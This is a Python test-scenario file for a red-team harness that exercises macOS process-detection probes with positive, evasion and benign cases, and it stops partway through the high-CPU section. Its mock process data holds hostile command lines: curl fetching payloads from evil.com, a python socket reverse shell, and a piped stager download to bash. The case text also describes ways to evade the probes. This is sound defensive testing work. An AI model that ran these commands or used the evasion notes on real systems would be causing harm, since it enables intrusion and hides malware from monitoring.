"""Proc agent probe scenarios — 10 probes × 8 adversarial cases each.

Each scenario exercises one proc micro-probe with:
  - 3 positive cases  (must fire)
  - 3 evasion cases   (documented detection gaps — attacker wins)
  - 2 benign mimics   (must NOT fire, or fire at expected low severity)

Probes covered:
    1.  ProcessSpawnProbe          — new process creation (T1059/T1204)
    2.  LOLBinExecutionProbe       — living-off-the-land binary abuse (T1218)
    3.  ProcessTreeAnomalyProbe    — unusual parent-child relationships (T1055/T1059)
    4.  HighCPUAndMemoryProbe      — resource hijacking / cryptomining (T1496)
    5.  LongLivedProcessProbe      — masquerading as short-lived utilities (T1036)
    6.  SuspiciousUserProcessProbe — services running as wrong user (T1078)
    7.  BinaryFromTempProbe        — execution from temp directories (T1204)
    8.  ScriptInterpreterProbe     — suspicious script execution patterns (T1059)
    9.  DylibInjectionProbe        — DYLD_INSERT_LIBRARIES abuse (T1547/T1574)
    10. CodeSigningProbe           — invalid code signatures on critical binaries (T1036)

Patching strategy (all proc probes read live system state):
    events=[] for every case — proc probes do NOT use shared_data injection.
    patch_targets replaces psutil.process_iter, time.time, subprocess.run,
    os.path.exists, and platform.system as needed per probe.

Stateful chains (HighCPUAndMemoryProbe and ProcessSpawnProbe require two
consecutive scans on the same probe instance to accumulate state):
    - stateful=True  cases share the ongoing probe instance
    - stateful=False cases always get a fresh probe and reset the chain

Run:
    amoskys-redteam run process_spawn
    amoskys-redteam run lolbin_execution
    amoskys-redteam run process_tree_anomaly
    amoskys-redteam run high_cpu_memory
    amoskys-redteam run long_lived_process
    amoskys-redteam run suspicious_user_process
    amoskys-redteam run binary_from_temp
    amoskys-redteam run script_interpreter
    amoskys-redteam run dylib_injection
    amoskys-redteam run code_signing
"""

from __future__ import annotations

from unittest.mock import MagicMock

from amoskys.agents.common.probes import Severity
from amoskys.agents.shared.process.probes import (
    BinaryFromTempProbe,
    CodeSigningProbe,
    DylibInjectionProbe,
    HighCPUAndMemoryProbe,
    LOLBinExecutionProbe,
    LongLivedProcessProbe,
    ProcessSpawnProbe,
    ProcessTreeAnomalyProbe,
    ScriptInterpreterProbe,
    SuspiciousUserProcessProbe,
)
from amoskys.redteam.harness import AdversarialCase, Scenario
from amoskys.redteam.scenarios import register

# ─── Timestamp anchors ───────────────────────────────────────────────────────

_T0 = 1_700_000_000.0  # Unix base (2023-11-14 22:13:20 UTC)
_T0_NS = int(_T0 * 1e9)

# ─── psutil mock helpers ─────────────────────────────────────────────────────


def _mk_proc(info_dict: dict) -> MagicMock:
    """Create a mock psutil process with a `.info` attribute."""
    p = MagicMock()
    p.info = info_dict
    return p


def _mk_parent(name: str = "init") -> MagicMock:
    """Create a mock psutil.Process() return value with callable `.name()`."""
    m = MagicMock()
    m.name.return_value = name
    return m


def _p(**kwargs) -> dict:
    """Build a process info dict with safe defaults covering all proc probes."""
    defaults = dict(
        pid=1234,
        name="bash",
        exe="/bin/bash",
        cmdline=["bash"],
        username="attacker",
        ppid=1,
        create_time=_T0,
        cpu_percent=0.0,
        memory_percent=0.0,
        status="running",
    )
    defaults.update(kwargs)
    return defaults


def _mock_iter(*procs: MagicMock):
    """Return a psutil.process_iter replacement that yields the given procs."""
    proc_list = list(procs)
    return lambda *a, **kw: iter(proc_list)


def _time_fn(t: float):
    """Return a time.time() replacement that always returns `t`."""
    return lambda: t


def _proc_factory(parent_name: str = "init"):
    """Return a psutil.Process(ppid) replacement yielding the named parent."""

    def _factory(pid):
        m = MagicMock()
        m.name.return_value = parent_name
        return m

    return _factory


# ─── subprocess mock helpers ─────────────────────────────────────────────────


def _dylib_ps_one(
    pid: int = 1234, proc_name: str = "bash", dylib: str = "/private/tmp/hooks.dylib"
):
    """Return a subprocess.run replacement with one DYLD_INSERT_LIBRARIES line."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 0
        m.stdout = f"{pid} {proc_name} DYLD_INSERT_LIBRARIES={dylib}\n"
        return m

    return _run


def _dylib_ps_two():
    """Return a subprocess.run replacement with two DYLD_INSERT_LIBRARIES lines."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 0
        m.stdout = (
            "1234 bash DYLD_INSERT_LIBRARIES=/private/tmp/hook1.dylib\n"
            "5678 python3 DYLD_INSERT_LIBRARIES=/private/tmp/hook2.dylib\n"
        )
        return m

    return _run


def _dylib_ps_no_dyld():
    """Return a subprocess.run replacement with no DYLD_INSERT_LIBRARIES."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 0
        m.stdout = "1234 bash DYLD_LIBRARY_PATH=/usr/local/lib\n"
        return m

    return _run


def _dylib_ps_framework():
    """Return a subprocess.run replacement with DYLD_FRAMEWORK_PATH only."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 0
        m.stdout = "2345 python3 DYLD_FRAMEWORK_PATH=/usr/local/Frameworks\n"
        return m

    return _run


def _ps_error():
    """Return a subprocess.run replacement that signals ps failure."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 1
        m.stderr = "permission denied"
        m.stdout = ""
        return m

    return _run


def _codesign_fail():
    """Return a codesign replacement returning non-zero (invalid signature)."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 1
        m.stderr = "code object is not signed at all"
        m.stdout = ""
        return m

    return _run


def _codesign_ok():
    """Return a codesign replacement returning 0 (valid signature)."""

    def _run(cmd, *args, **kwargs):
        m = MagicMock()
        m.returncode = 0
        m.stderr = ""
        m.stdout = ""
        return m

    return _run


def _codesign_missing():
    """Return a subprocess.run replacement that raises FileNotFoundError."""

    def _run(cmd, *args, **kwargs):
        raise FileNotFoundError("codesign not found")

    return _run


# ─── Patch-target key constants ───────────────────────────────────────────────

_PA = "amoskys.agents.shared.process.probes.PSUTIL_AVAILABLE"
_PI = "amoskys.agents.shared.process.probes.psutil.process_iter"
_PP = "amoskys.agents.shared.process.probes.psutil.Process"
_PF = "amoskys.agents.shared.process.probes.platform.system"
_OE = "amoskys.agents.shared.process.probes.os.path.exists"
_TT = "time.time"
_SR = "subprocess.run"


def _pp(procs=(), parent_name="init", time_val=None, **extra):
    """Build a standard patch dict for process-iter-based proc probes."""
    patches = {
        _PA: True,
        _PI: _mock_iter(*procs),
        _PP: _proc_factory(parent_name),
    }
    if time_val is not None:
        patches[_TT] = _time_fn(time_val)
    patches.update(extra)
    return patches


# =============================================================================
# 1. ProcessSpawnProbe — new process creation (T1059/T1204)
# =============================================================================
#
# Stateful design: probe accumulates known_pids across scans.
#   Scan 1 (first_run=True): learns all current PIDs, returns 0 events.
#   Scan 2+ (first_run=False): fires process_spawned for any NEW PIDs.
#
# Chain 1 (positives):   cases 1-2 share probe A
# Chain 2 (evasions):    cases 4-5 share probe C  (case 3 is standalone, breaks chain A)
# Chain 3 (benigns):     cases 7-8 share probe E  (case 6 is standalone, breaks chain C)

_KNOWN_PROCS = [
    _mk_proc(_p(pid=1, name="launchd", username="root")),
    _mk_proc(_p(pid=2, name="kernel_task", username="root")),
    _mk_proc(_p(pid=3, name="loginwindow", username="user1")),
]

_SPAWN_POS1_SETUP = AdversarialCase(
    id="spawn_pos1_setup",
    title="Baseline scan — learning phase, 0 events",
    category="positive",
    description=(
        "ProcessSpawnProbe on first run captures all running PIDs as baseline. "
        "No events emitted; this is the setup scan for the detection chain."
    ),
    why=(
        "first_run=True → skips all processes during baseline learning. "
        "known_pids is populated with {1, 2, 3} and first_run set to False."
    ),
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(_KNOWN_PROCS),
)

_SPAWN_POS1_FIRE = AdversarialCase(
    id="spawn_pos1_fire",
    title="Second scan — attacker's bash (PID 9999) fires process_spawned INFO",
    category="positive",
    description=(
        "A new bash process (PID 9999) appears after the baseline. Probe fires "
        "process_spawned at INFO severity — the core process-creation telemetry."
    ),
    why=(
        "PID 9999 not in known_pids → process_spawned emitted. "
        "Severity INFO: probe is a universal auditor, not a high-confidence alert."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["process_spawned"],
    expect_severity=Severity.INFO,
    stateful=True,
    patch_targets=_pp(
        [
            *_KNOWN_PROCS,
            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
        ]
    ),
)

_SPAWN_EVA_HOLLOW = AdversarialCase(
    id="spawn_eva_hollow",
    title="Process hollowing — injected PID already known, never fires",
    category="evasion",
    description=(
        "Attacker injects shellcode into an existing process (PID 2, "
        "'kernel_task'). No new PID is created; the injected code runs inside "
        "the original process. ProcessSpawnProbe only tracks NEW PIDs."
    ),
    why=(
        "Fresh probe: first_run=True → 0 events regardless. More critically: "
        "process injection reuses an existing PID, so even after baseline is "
        "established the process_spawned event never fires for the hollowed PID. "
        "Shellcode injection, thread injection, and process hollowing all evade "
        "spawn detection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=False,
    patch_targets=_pp(_KNOWN_PROCS),
)

_SPAWN_EVA_PRERUN_SETUP = AdversarialCase(
    id="spawn_eva_prerun_setup",
    title="Pre-monitoring persistence chain — attacker in baseline (scan 1 of 2)",
    category="evasion",
    description=(
        "Attacker's reverse shell (PID 9999) was running BEFORE the probe "
        "started. First scan captures it as 'known'. Setup for next case."
    ),
    why="first_run=True → 0 events. Attacker's PID 9999 absorbed into known_pids.",
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(
        [
            *_KNOWN_PROCS,
            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
        ]
    ),
)

_SPAWN_EVA_PRERUN_PERSIST = AdversarialCase(
    id="spawn_eva_prerun_persist",
    title="Pre-monitoring persistence — same PID 9999 stays silent",
    category="evasion",
    description=(
        "Second scan on the same probe instance. Attacker's PID 9999 is still "
        "running but is already in known_pids → zero spawn events. Attacker "
        "maintains a pre-existing foothold without triggering spawn detection."
    ),
    why=(
        "PID 9999 is in known_pids from scan 1 → skipped. "
        "This is the core 'pre-monitoring persistence' gap: if the attacker was "
        "already running when monitoring started, spawn detection is permanently "
        "blind to that process."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=True,
    patch_targets=_pp(
        [
            *_KNOWN_PROCS,
            _mk_proc(_p(pid=9999, name="bash", exe="/bin/bash", username="attacker")),
        ]
    ),
)

_SPAWN_EVA_INJECT = AdversarialCase(
    id="spawn_eva_inject",
    title="Thread injection — no new PID, probe permanently blind",
    category="evasion",
    description=(
        "Attacker uses mach_inject or task_for_pid to run shellcode inside an "
        "existing process. From psutil's perspective the process list is "
        "unchanged. No new PID ever appears."
    ),
    why=(
        "Fresh probe: baseline scan absorbs all current PIDs. Even on subsequent "
        "scans, the injected thread never generates a new PID. "
        "ProcessSpawnProbe cannot detect thread/shellcode injection."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=False,
    patch_targets=_pp(_KNOWN_PROCS),
)

_SPAWN_BENIGN_SETUP = AdversarialCase(
    id="spawn_benign_setup",
    title="Benign chain baseline — 2 system daemons",
    category="benign",
    description="First scan on a clean system. Establishes baseline with 2 daemons.",
    why="first_run=True → 0 events. PIDs {1, 2} absorbed into known_pids.",
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(
        [
            _mk_proc(_p(pid=1, name="launchd", username="root")),
            _mk_proc(_p(pid=2, name="syslogd", username="root")),
        ]
    ),
)

_SPAWN_BENIGN_CRON = AdversarialCase(
    id="spawn_benign_cron",
    title="Legitimate cron job fires process_spawned INFO — expected telemetry",
    category="benign",
    description=(
        "A scheduled launchd job (PID 3000, 'backup.sh') starts legitimately. "
        "The probe fires process_spawned INFO. This is correct behaviour: the "
        "probe is a universal audit log, not a threat detector."
    ),
    why=(
        "PID 3000 is new → process_spawned INFO emitted. INFO severity means "
        "the SOC correlates this with higher-severity probes for incident context, "
        "not as a standalone alert. Benign spawns fire INFO by design."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["process_spawned"],
    expect_severity=Severity.INFO,
    stateful=True,
    patch_targets=_pp(
        [
            _mk_proc(_p(pid=1, name="launchd", username="root")),
            _mk_proc(_p(pid=2, name="syslogd", username="root")),
            _mk_proc(
                _p(
                    pid=3000,
                    name="backup.sh",
                    exe="/usr/local/bin/backup.sh",
                    username="root",
                )
            ),
        ]
    ),
)

process_spawn_scenario = register(
    Scenario(
        probe_id="process_spawn",
        agent="proc",
        name="process_spawn",
        title="Process Spawn Detection — T1059 / T1204",
        description=(
            "Exercises ProcessSpawnProbe across 3 stateful chains: "
            "a 2-scan positive chain (baseline→fire), a 2-scan evasion chain "
            "(pre-monitoring persistence), and a 2-scan benign chain. "
            "Standalone evasion cases document process hollowing and thread injection."
        ),
        mitre_techniques=["T1059", "T1204"],
        mitre_tactics=["execution"],
        probe_factory=ProcessSpawnProbe,
        cases=[
            _SPAWN_POS1_SETUP,
            _SPAWN_POS1_FIRE,
            _SPAWN_EVA_HOLLOW,
            _SPAWN_EVA_PRERUN_SETUP,
            _SPAWN_EVA_PRERUN_PERSIST,
            _SPAWN_EVA_INJECT,
            _SPAWN_BENIGN_SETUP,
            _SPAWN_BENIGN_CRON,
        ],
    )
)


# =============================================================================
# 2. LOLBinExecutionProbe — living-off-the-land binary abuse (T1218)
# =============================================================================
#
# Fires LOW for any known LOLBin (informational); HIGH when suspicious usage
# patterns are detected. All evasions exploit the fixed-name LOLBin list.

_LOLBIN_POS1 = AdversarialCase(
    id="lolbin_pos1_curl_dl",
    title="curl downloading .exe — HIGH (downloading_executable pattern)",
    category="positive",
    description=(
        "Attacker uses curl to download a Windows PE from an HTTP C2 server, "
        "piping output to /tmp. The '-o' flag and '.exe' extension match "
        "the 'downloading_executable' suspicious usage pattern."
    ),
    why=(
        "curl is in LOLBINS_MACOS; cmdline matches _check_suspicious_usage: "
        "'-o ', 'http://', and '.exe' all present → patterns=['downloading_executable'] "
        "→ severity=HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="curl",
                    exe="/usr/bin/curl",
                    cmdline=[
                        "curl",
                        "-o",
                        "/tmp/payload.exe",
                        "http://evil.com/payload.exe",
                    ],
                )
            )
        ]
    ),
)

_LOLBIN_POS2 = AdversarialCase(
    id="lolbin_pos2_python_socket",
    title="python3 -c 'import socket; exec(...)' — HIGH (encoded_command)",
    category="positive",
    description=(
        "Attacker uses python3 -c to run an inline reverse shell that imports "
        "the socket module. The '-c ' flag matches the 'encoded_command' pattern."
    ),
    why=(
        "python3 in LOLBINS_MACOS; cmdline_str contains '-c ' → "
        "patterns=['encoded_command'] → HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="python3",
                    exe="/usr/bin/python3",
                    cmdline=[
                        "python3",
                        "-c",
                        "import socket;s=socket.socket();s.connect(('10.0.0.1',4444))",
                    ],
                )
            )
        ]
    ),
)

_LOLBIN_POS3 = AdversarialCase(
    id="lolbin_pos3_bash_hidden",
    title="bash with nohup redirected to /dev/null — HIGH (hidden_execution)",
    category="positive",
    description=(
        "Attacker runs a download-and-execute one-liner via bash, suppressing "
        "all output with nohup and /dev/null to evade terminal logging."
    ),
    why=(
        "bash is in LOLBINS_MACOS; cmdline_str contains 'nohup' → "
        "patterns=['hidden_execution'] → HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.HIGH,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="bash",
                    exe="/bin/bash",
                    cmdline=[
                        "bash",
                        "-c",
                        "nohup curl http://evil.com/stager | bash &>/dev/null",
                    ],
                )
            )
        ]
    ),
)

_LOLBIN_EVA1 = AdversarialCase(
    id="lolbin_eva1_custom_binary",
    title="Custom Go/C binary 'c2agent' — not in LOLBin list, 0 events",
    category="evasion",
    description=(
        "Attacker compiles a custom Go C2 agent named 'c2agent'. It is not in "
        "LOLBINS_MACOS, so LOLBinExecutionProbe never fires."
    ),
    why=(
        "Probe checks exact name.lower() membership in LOLBINS_MACOS. "
        "'c2agent' is not in the list → no event fired. Attacker evades by "
        "delivering a custom binary instead of abusing system utilities."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="c2agent",
                    exe="/usr/local/bin/c2agent",
                    cmdline=["c2agent", "--connect", "evil.com:443"],
                )
            )
        ]
    ),
)

_LOLBIN_EVA2 = AdversarialCase(
    id="lolbin_eva2_versioned_python",
    title="python3.12 — exact-name mismatch evades list check",
    category="evasion",
    description=(
        "Attacker invokes Python 3.12 via the versioned binary 'python3.12'. "
        "LOLBINS_MACOS contains 'python3' (exact match) but not 'python3.12'."
    ),
    why=(
        "name.lower() == 'python3.12' ∉ LOLBINS_MACOS → 0 events. "
        "This is a systematic gap: any versioned binary (python3.11, python3.10) "
        "or aliased name evades the fixed-string list."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="python3.12",
                    exe="/usr/local/bin/python3.12",
                    cmdline=[
                        "python3.12",
                        "-c",
                        "import socket;exec(open('/tmp/p').read())",
                    ],
                )
            )
        ]
    ),
)

_LOLBIN_EVA3 = AdversarialCase(
    id="lolbin_eva3_swift_binary",
    title="Swift-compiled C2 binary — interpreter not monitored, 0 events",
    category="evasion",
    description=(
        "Attacker compiles their implant in Swift or Objective-C. The resulting "
        "binary ('XPCHelper') is not an interpreted LOLBin and is not in the "
        "LOLBINS_MACOS dictionary."
    ),
    why=(
        "'xpchelper' ∉ LOLBINS_MACOS → 0 events. "
        "Compiled native binaries evade all LOLBin-list-based detection. "
        "The probe covers interpreters and download utilities — not native apps."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="XPCHelper",
                    exe="/usr/local/bin/XPCHelper",
                    cmdline=["XPCHelper", "--daemonize"],
                )
            )
        ]
    ),
)

_LOLBIN_BENIGN1 = AdversarialCase(
    id="lolbin_benign1_curl_api",
    title="curl legitimate API health-check — fires LOW (informational only)",
    category="benign",
    description=(
        "Monitoring automation uses curl to poll an HTTPS health endpoint. "
        "No executable download or suspicious pattern — probe fires LOW."
    ),
    why=(
        "curl ∈ LOLBINS_MACOS → probe fires. _check_suspicious_usage: URL "
        "contains 'https://' but no '.exe/.dll/.ps1' → no 'downloading_executable'. "
        "No other patterns match → patterns=[] → severity=LOW (informational)."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.LOW,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="curl",
                    exe="/usr/bin/curl",
                    cmdline=["curl", "https://api.example.com/health"],
                )
            )
        ]
    ),
)

_LOLBIN_BENIGN2 = AdversarialCase(
    id="lolbin_benign2_python_analysis",
    title="python3 log analysis script — fires LOW (informational only)",
    category="benign",
    description=(
        "A data-engineering job runs python3 to analyze log files. No inline "
        "code, no downloads, no suspicious imports in cmdline → fires LOW."
    ),
    why=(
        "python3 ∈ LOLBINS_MACOS → fires. No '-c ', '-enc', 'base64', or "
        "eval/exec in cmdline_str → patterns=[] → LOW. Broad LOLBin detection "
        "fires on every python3 invocation; severity gates false positives."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["lolbin_execution"],
    expect_severity=Severity.LOW,
    patch_targets=_pp(
        [
            _mk_proc(
                _p(
                    name="python3",
                    exe="/usr/bin/python3",
                    cmdline=["python3", "analyze_logs.py", "--date", "2024-01-01"],
                )
            )
        ]
    ),
)

lolbin_execution_scenario = register(
    Scenario(
        probe_id="lolbin_execution",
        agent="proc",
        name="lolbin_execution",
        title="LOLBin Execution Detection — T1218",
        description=(
            "Tests LOLBinExecutionProbe's binary-name list + suspicious-pattern "
            "detection. Evasions exploit the fixed LOLBin name list (exact match): "
            "custom binaries, versioned names, and native compiled code all evade."
        ),
        mitre_techniques=["T1218", "T1218.010", "T1218.011"],
        mitre_tactics=["defense_evasion", "execution"],
        probe_factory=LOLBinExecutionProbe,
        cases=[
            _LOLBIN_POS1,
            _LOLBIN_POS2,
            _LOLBIN_POS3,
            _LOLBIN_EVA1,
            _LOLBIN_EVA2,
            _LOLBIN_EVA3,
            _LOLBIN_BENIGN1,
            _LOLBIN_BENIGN2,
        ],
    )
)


# =============================================================================
# 3. ProcessTreeAnomalyProbe — suspicious parent-child relationships (T1055/T1059)
# =============================================================================
#
# Checks (parent_name, child_name) pairs against SUSPICIOUS_TREES using
# substring matching (parent_name in process_name). psutil.Process(ppid) is
# mocked to supply parent name.


def _tree_patches(child_name: str, child_ppid: int, parent_name: str) -> dict:
    """Build patch dict for ProcessTreeAnomalyProbe tests."""
    return _pp(
        procs=[_mk_proc(_p(pid=child_ppid + 10, name=child_name, ppid=child_ppid))],
        parent_name=parent_name,
    )


_TREE_POS1 = AdversarialCase(
    id="tree_pos1_word_powershell",
    title="word → powershell — Office macro execution HIGH",
    category="positive",
    description=(
        "Microsoft Word spawns PowerShell — the canonical macro-execution "
        "process tree. Signals document-based initial access (T1566)."
    ),
    why=(
        "('word', 'powershell') ∈ SUSPICIOUS_TREES → 'Office macro execution'. "
        "parent_name.lower()='microsoft word' contains 'word'; "
        "child_name.lower()='powershell' contains 'powershell' → fires HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_process_tree"],
    expect_severity=Severity.HIGH,
    patch_targets=_tree_patches("powershell", 200, "Microsoft Word"),
)

_TREE_POS2 = AdversarialCase(
    id="tree_pos2_firefox_bash",
    title="firefox → bash — browser exploit HIGH",
    category="positive",
    description=(
        "Firefox spawns a bash shell — indicates a browser exploit that escaped "
        "the sandbox and gained code execution on the host."
    ),
    why=(
        "('firefox', 'bash') ∈ SUSPICIOUS_TREES → 'Browser exploit'. "
        "parent contains 'firefox', child is 'bash' → fires HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_process_tree"],
    expect_severity=Severity.HIGH,
    patch_targets=_tree_patches("bash", 300, "firefox"),
)

_TREE_POS3 = AdversarialCase(
    id="tree_pos3_preview_bash",
    title="preview → bash — PDF exploit HIGH",
    category="positive",
    description=(
        "macOS Preview app spawns bash, indicating a malicious PDF that "
        "triggered arbitrary code execution via a Preview vulnerability."
    ),
    why=(
        "('preview', 'bash') ∈ SUSPICIOUS_TREES → 'PDF exploit'. "
        "Substring match: parent 'preview' contains 'preview' → fires HIGH."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["suspicious_process_tree"],
    expect_severity=Severity.HIGH,
    patch_targets=_tree_patches("bash", 400, "preview"),
)

_TREE_EVA1 = AdversarialCase(
    id="tree_eva1_safari_powershell",
    title="safari → powershell — not in SUSPICIOUS_TREES, 0 events",
    category="evasion",
    description=(
        "Attacker exploits Safari to spawn PowerShell for Windows-style "
        "living-off-the-land. SUSPICIOUS_TREES has (safari, bash) but not "
        "(safari, powershell) → undetected."
    ),
    why=(
        "Probe checks pairs from SUSPICIOUS_TREES. (safari, powershell) is "
        "NOT in the dict; only (safari, bash) is. "
        "Attacker escapes detection by choosing a child binary not in the list."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_tree_patches("powershell", 500, "safari"),
)

_TREE_EVA2 = AdversarialCase(
    id="tree_eva2_chrome_python",
    title="chrome → python3 — partial list evasion, 0 events",
    category="evasion",
    description=(
        "Attacker exploits Chrome to spawn python3 for a reverse shell. "
        "Only (chrome, powershell) and (chrome, cmd) are in SUSPICIOUS_TREES."
    ),
    why=(
        "(chrome, python3) ∉ SUSPICIOUS_TREES. The fixed-pair list cannot "
        "enumerate every possible suspicious child process. Attacker wins by "
        "using a child binary not in the monitored combinations."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_tree_patches("python3", 600, "chrome"),
)

_TREE_EVA3 = AdversarialCase(
    id="tree_eva3_nginx_bash",
    title="nginx → bash — web server exploit not in parent list, 0 events",
    category="evasion",
    description=(
        "Attacker exploits a vulnerable nginx plugin to spawn bash. nginx is "
        "not in SUSPICIOUS_TREES as a parent, so the exploit chain is invisible."
    ),
    why=(
        "'nginx' ∉ any monitored parent in SUSPICIOUS_TREES. The list covers "
        "Office, browsers, PDF readers, and Windows services — not web servers. "
        "Server-side exploit chains evade the desktop-centric tree monitor."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    patch_targets=_tree_patches("bash", 700, "nginx"),
)

_TREE_BENIGN1 = AdversarialCase(
    id="tree_benign1_bash_python",
    title="bash → python3 — normal dev workflow, 0 events",
    category="benign",
    description=(
        "Developer runs a Python script from a bash terminal session. "
        "Legitimate (bash, python3) pair not in SUSPICIOUS_TREES — correctly "
        "ignored."
    ),
    why=(
        "(bash, python3) ∉ SUSPICIOUS_TREES. Probe correctly returns 0 events. "
        "Normal developer workflows produce common parent-child pairs that "
        "don't overlap with the monitored suspicious combinations."
    ),
    events=[],
    expect_count=0,
    patch_targets=_tree_patches("python3", 800, "bash"),
)

_TREE_BENIGN2 = AdversarialCase(
    id="tree_benign2_launchd_bash",
    title="launchd → bash — normal daemon spawn, 0 events",
    category="benign",
    description=(
        "launchd starts a bash script as part of a scheduled job. "
        "Entirely normal macOS behaviour — (launchd, bash) not in the list."
    ),
    why=(
        "(launchd, bash) ∉ SUSPICIOUS_TREES. Probe correctly ignores "
        "legitimate daemon spawns from launchd."
    ),
    events=[],
    expect_count=0,
    patch_targets=_tree_patches("bash", 900, "launchd"),
)

process_tree_scenario = register(
    Scenario(
        probe_id="process_tree_anomaly",
        agent="proc",
        name="process_tree_anomaly",
        title="Process Tree Anomaly Detection — T1055 / T1059",
        description=(
            "Tests ProcessTreeAnomalyProbe's (parent, child) pair matching. "
            "Covers Office macro, browser exploit, and PDF exploit positives. "
            "Evasions show that partial pairs, new parent processes, and non-listed "
            "child binaries all bypass the fixed SUSPICIOUS_TREES dictionary."
        ),
        mitre_techniques=["T1055", "T1059"],
        mitre_tactics=["execution", "defense_evasion"],
        probe_factory=ProcessTreeAnomalyProbe,
        cases=[
            _TREE_POS1,
            _TREE_POS2,
            _TREE_POS3,
            _TREE_EVA1,
            _TREE_EVA2,
            _TREE_EVA3,
            _TREE_BENIGN1,
            _TREE_BENIGN2,
        ],
    )
)


# =============================================================================
# 4. HighCPUAndMemoryProbe — resource hijacking / cryptomining (T1496)
# =============================================================================
#
# Fires MEDIUM after a process sustains > 80% CPU or > 50% MEM for >= 60s.
# Requires 2 stateful scans: scan 1 starts tracking, scan 2 fires.
#
# Chain 1 (positives):  cases 1-2  (probe A: T0 setup, T0+65 fire)
# Chain 2 (evasions):   cases 4-5  (probe C: T0 brief setup, T0+30 drop)
#   case 3 is standalone and breaks chain 1.
# Chain 3 (benigns):    cases 7-8  (probe E: T0 compiler, T0+65 fire)
#   case 6 is standalone and breaks chain 2.

_CPU_PID = 5000
_MEM_PID = 6000
_CC_PID = 8000

_CPU_SETUP = AdversarialCase(
    id="hicpu_pos1_setup",
    title="Cryptominer at 92% CPU — first scan, tracking starts (0 events)",
    category="positive",
    description=(
        "A cryptominer process (PID 5000) immediately pegs the CPU at 92%. "
        "The first scan adds it to high_resource_pids with the current timestamp; "
        "the 60-second sustained threshold has not yet elapsed."
    ),
    why=(
        "Probe records high_resource_pids[5000] = T0. "
        "Condition: now - first_seen = 0 < 60 → no event yet."
    ),
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_CPU_PID, name="xmrig", cpu_percent=92.0))],
        time_val=_T0,
    ),
)

_CPU_FIRE = AdversarialCase(
    id="hicpu_pos1_fire",
    title="Cryptominer sustained 65s → high_resource_process MEDIUM",
    category="positive",
    description=(
        "65 seconds after first detection, the miner is still pegging CPU at "
        "92%. The sustained threshold (60s) is exceeded → fires MEDIUM."
    ),
    why=(
        "now(T0+65) - high_resource_pids[5000](T0) = 65 > 60 → "
        "high_resource_process MEDIUM emitted."
    ),
    events=[],
    expect_count=1,
    expect_event_types=["high_resource_process"],
    expect_severity=Severity.MEDIUM,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_CPU_PID, name="xmrig", cpu_percent=92.0))],
        time_val=_T0 + 65.0,
    ),
)

_HICPU_EVA_THROTTLE = AdversarialCase(
    id="hicpu_eva_throttle",
    title="Miner throttles to 75% CPU — stays below 80% threshold, 0 events",
    category="evasion",
    description=(
        "Sophisticated cryptominer monitors its own CPU usage and caps at 75% "
        "to stay under the 80% detection threshold. Probe never records it in "
        "high_resource_pids."
    ),
    why=(
        "is_high = 75.0 > 80.0 → False. Process is never added to "
        "high_resource_pids regardless of how long it runs. "
        "Fixed threshold: miners can calibrate below it."
    ),
    events=[],
    expect_count=0,
    expect_evades=True,
    stateful=False,
    patch_targets=_pp(
        [_mk_proc(_p(pid=7000, name="miner", cpu_percent=75.0))],
        time_val=_T0,
    ),
)

_HICPU_BRIEF_SETUP = AdversarialCase(
    id="hicpu_eva_brief_setup",
    title="Brief CPU spike setup — miner at 90% at T0",
    category="evasion",
    description=(
        "Miner spikes to 90% CPU briefly. First scan starts tracking. "
        "Setup for the next case where the miner drops before sustain threshold."
    ),
    why="high_resource_pids[6000] = T0. Condition not yet met → 0 events.",
    events=[],
    expect_count=0,
    stateful=True,
    patch_targets=_pp(
        [_mk_proc(_p(pid=_MEM_PID, name="miner2", cpu_percent=90.0))],
        time_val=_T0,
    ),
)

_HICPU_BRIEF_DROP = AdversarialCase(
    id="hicpu_eva_brief_drop",
    title="Miner drops to 5% at T0+30 — removed from tracking, 0 events",
    category="evasion",
    description=(
        "30 seconds after the spike the miner throttles to 5% CPU. "
